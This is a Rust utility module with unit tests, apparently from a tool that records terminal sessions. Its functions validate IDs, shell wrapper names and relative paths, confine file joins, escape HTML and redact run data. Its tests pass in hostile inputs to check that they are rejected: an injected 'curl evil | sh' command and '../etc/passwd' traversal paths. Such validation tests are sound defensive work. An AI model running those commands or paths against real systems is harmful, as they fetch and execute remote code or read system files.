//! Shared utility functions used across modules.

use std::path::{Component, Path, PathBuf};

/// Truncate a string to `max` bytes, appending `…` if shortened.
///
/// The cut point is rounded down to a valid char boundary.
///
/// # Examples
///
/// ```
/// # use blackbox as _;
/// // `truncate` — see module docs for full workflow.
/// ```
pub fn truncate(s: &str, max: usize) -> String {
    if s.len() <= max {
        s.to_string()
    } else {
        format!("{}…", &s[..s.floor_char_boundary(max)])
    }
}

/// Safe run / event id for use as a filesystem or object key component.
///
/// Allows UUID-like and short hex prefixes; rejects empty, separators, and `..`.
///
/// # Examples
///
/// ```
/// # use blackbox as _;
/// // `is_safe_id` — see module docs for full workflow.
/// ```
pub fn is_safe_id(id: &str) -> bool {
    let b = id.as_bytes();
    if b.is_empty() || b.len() > 128 {
        return false;
    }
    b.iter()
        .all(|c| c.is_ascii_alphanumeric() || *c == b'-' || *c == b'_')
}

/// Shell harness wrap basename: must be a pure function identifier.
///
/// Used before writing ambient wrappers into the user's rc file so a
/// project `config.toml` cannot inject shell metacharacters.
///
/// # Examples
///
/// ```
/// # use blackbox as _;
/// // `is_safe_wrap_name` — see module docs for full workflow.
/// ```
pub fn is_safe_wrap_name(name: &str) -> bool {
    let b = name.as_bytes();
    if b.is_empty() || b.len() > 64 {
        return false;
    }
    // Must start with letter or underscore (valid shell function name).
    if !(b[0].is_ascii_alphabetic() || b[0] == b'_') {
        return false;
    }
    b.iter()
        .all(|c| c.is_ascii_alphanumeric() || *c == b'-' || *c == b'_')
}

/// Reject absolute paths and `..` / prefix components in a relative path string.
///
/// # Examples
///
/// ```no_run
/// # use blackbox as _;
/// // `validate_relative_path` — see module docs for full workflow.
/// ```
pub fn validate_relative_path(relative: &str) -> anyhow::Result<&Path> {
    if relative.is_empty() {
        anyhow::bail!("empty relative path refused");
    }
    let p = Path::new(relative);
    if p.is_absolute() {
        anyhow::bail!("absolute path refused: {relative}");
    }
    for c in p.components() {
        match c {
            Component::Normal(os) => {
                if os.is_empty() {
                    anyhow::bail!("empty path component refused");
                }
            }
            Component::CurDir => {}
            Component::ParentDir => anyhow::bail!("parent directory (..) refused: {relative}"),
            Component::RootDir | Component::Prefix(_) => {
                anyhow::bail!("absolute/prefix path refused: {relative}");
            }
        }
    }
    Ok(p)
}

/// Join `base` / `relative` after validating that `relative` cannot escape `base`.
///
/// # Examples
///
/// ```no_run
/// # use blackbox as _;
/// // `confined_join` — see module docs for full workflow.
/// ```
pub fn confined_join(base: &Path, relative: &str) -> anyhow::Result<PathBuf> {
    let rel = validate_relative_path(relative)?;
    let mut out = base.to_path_buf();
    for c in rel.components() {
        if let Component::Normal(part) = c {
            out.push(part);
        }
    }
    Ok(out)
}

/// Sync-manifest file entry: must be `runs/<safe-id>.json` only.
///
/// # Examples
///
/// ```
/// # use blackbox as _;
/// // `is_safe_sync_run_file` — see module docs for full workflow.
/// ```
pub fn is_safe_sync_run_file(file: &str) -> bool {
    let Some(name) = file.strip_prefix("runs/") else {
        return false;
    };
    if name.contains('/') || name.contains('\\') {
        return false;
    }
    let Some(stem) = name.strip_suffix(".json") else {
        return false;
    };
    is_safe_id(stem)
}

/// HTML-escape the five standard entities.
///
/// # Examples
///
/// ```no_run
/// # use blackbox as _;
/// // `html_escape` — see module docs for full workflow.
/// ```
pub fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#x27;")
}

/// Redact sensitive fields in a run JSON value (cwd → basename only).
///
/// # Examples
///
/// ```no_run
/// # use blackbox as _;
/// // `redact_run` — see module docs for full workflow.
/// ```
pub fn redact_run(val: &mut serde_json::Value) {
    if let Some(obj) = val.as_object_mut() {
        if let Some(cwd) = obj.get("cwd").and_then(|v| v.as_str()) {
            let basename = std::path::Path::new(cwd)
                .file_name()
                .map(|f| f.to_string_lossy().to_string())
                .unwrap_or_else(|| "(redacted)".to_string());
            obj.insert("cwd".to_string(), serde_json::json!(basename));
        }
    }
}

/// Redact sensitive fields in an event JSON value (raw terminal, diff_preview).
///
/// # Examples
///
/// ```no_run
/// # use blackbox as _;
/// // `redact_event` — see module docs for full workflow.
/// ```
pub fn redact_event(val: &mut serde_json::Value) {
    if let Some(obj) = val.as_object_mut() {
        if let Some(meta) = obj.get_mut("metadata").and_then(|v| v.as_object_mut()) {
            meta.remove("raw");
            if meta.contains_key("diff_preview") {
                meta.insert("diff_preview".to_string(), serde_json::json!("[REDACTED]"));
            }
        }
    }
}

/// Bookkeeping event kinds that carry no semantic signal for users.
///
/// # Examples
///
/// ```
/// # use blackbox as _;
/// // `is_bookkeeping` — see module docs for full workflow.
/// ```
pub fn is_bookkeeping(kind: &str) -> bool {
    matches!(
        kind,
        "pty.started"
            | "pty.stopped"
            | "git.observer.started"
            | "git.observer.stopped"
            | "filesystem.observer.started"
            | "filesystem.observer.stopped"
            | "process.observer.started"
            | "process.observer.stopped"
            | "terminal.recording"
            | "git.commit"
            | "git.commit.after"
    )
}

/// Return the first 8 characters of an id (or the whole string if shorter).
///
/// # Examples
///
/// ```
/// # use blackbox as _;
/// // `short_id` — see module docs for full workflow.
/// ```
pub fn short_id(id: &str) -> &str {
    &id[..8.min(id.len())]
}

/// Merge run notes segments without clobbering prior parts.
///
/// Segments are joined with `"; "`. Empty parts are skipped. Duplicate exact
/// segments already present in `existing` are not re-appended.
///
/// # Examples
///
/// ```no_run
/// # use blackbox as _;
/// // `merge_run_notes` — see module docs for full workflow.
/// ```
pub fn merge_run_notes(existing: Option<String>, parts: &[&str]) -> String {
    let mut segments: Vec<String> = existing
        .unwrap_or_default()
        .split(';')
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect();
    for p in parts {
        let p = p.trim();
        if p.is_empty() {
            continue;
        }
        if !segments.iter().any(|s| s == p) {
            segments.push(p.to_string());
        }
    }
    segments.join("; ")
}

#[cfg(test)]
mod notes_tests {
    use super::*;

    #[test]
    fn merge_preserves_continuity_and_adapter() {
        let n = merge_run_notes(Some("auto_resume:abcdef12".into()), &["adapter:claude"]);
        assert!(n.contains("auto_resume:abcdef12"));
        assert!(n.contains("adapter:claude"));
        let n2 = merge_run_notes(Some(n), &["session:xyz"]);
        assert!(n2.contains("adapter:claude"));
        assert!(n2.contains("session:xyz"));
        assert!(n2.contains("auto_resume:abcdef12"));
    }

    #[test]
    fn merge_skips_duplicates() {
        let n = merge_run_notes(
            Some("adapter:claude".into()),
            &["adapter:claude", "claim:1"],
        );
        assert_eq!(n.matches("adapter:claude").count(), 1);
        assert!(n.contains("claim:1"));
    }

    #[test]
    fn safe_id_and_wrap_name() {
        assert!(is_safe_id("aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"));
        assert!(is_safe_id("abcd1234"));
        assert!(!is_safe_id("../evil"));
        assert!(!is_safe_id("a/b"));
        assert!(!is_safe_id(""));
        assert!(is_safe_wrap_name("claude"));
        assert!(is_safe_wrap_name("my_tool-1"));
        assert!(!is_safe_wrap_name("claude; curl evil | sh"));
        assert!(!is_safe_wrap_name("1bad"));
        assert!(!is_safe_wrap_name(""));
    }

    #[test]
    fn confined_join_blocks_escape() {
        let base = Path::new("/tmp/sync");
        assert!(confined_join(base, "runs/a.json").is_ok());
        assert!(confined_join(base, "../etc/passwd").is_err());
        assert!(confined_join(base, "/etc/passwd").is_err());
        assert!(is_safe_sync_run_file(
            "runs/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee.json"
        ));
        assert!(!is_safe_sync_run_file("../../x.json"));
        assert!(!is_safe_sync_run_file("runs/../x.json"));
        assert!(!is_safe_sync_run_file("/tmp/x.json"));
    }
}
